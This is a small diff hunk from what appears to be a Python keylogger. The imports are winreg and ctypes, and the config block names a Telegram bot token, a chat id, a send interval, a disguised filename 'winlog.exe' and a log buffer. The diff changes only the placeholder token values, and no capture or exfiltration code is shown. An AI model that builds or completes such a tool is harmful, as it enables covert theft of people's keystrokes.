@@ -8,8 +8,8 @@ import winreg
 import ctypes
 
 # --- Config ---
-bot_token = 'Your_Telegram_Bot_Token_Here'
-chat_id = 'Your_Telegram_Chat_ID_Here'
+bot_token = 'bot_token'
+chat_id = 'chat_id'
 interval = 60
 filename = "winlog.exe"
 log = ""
